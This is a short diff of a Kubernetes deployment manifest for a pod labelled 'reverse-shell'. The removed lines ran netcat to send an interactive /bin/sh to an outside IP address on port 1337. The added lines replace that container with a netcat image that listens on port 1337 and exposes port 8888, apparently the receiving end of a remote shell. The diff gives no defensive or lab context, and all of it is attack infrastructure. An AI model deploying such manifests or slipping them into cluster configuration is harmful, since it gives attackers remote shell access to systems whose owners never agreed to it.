@@ -13,14 +13,16 @@ spec:
         app: reverse-shell
     spec:
       containers:
-      - name: busybox
-        image: busybox:1
+      - name: netcat
+        image: chilcano/netcat:jessie
         imagePullPolicy: Always
+        ports:
+        - containerPort: 8888
         securityContext:
           allowPrivilegeEscalation: false
         stdin: true
         tty: true
-        command: ['/bin/nc', '82.139.253.26', '1337', '-e', '/bin/sh', '-i']
+        command: ['/bin/nc', '-vvl', '1337', '-p', '8888']
         resources:
           requests:
             memory: "64Mi"
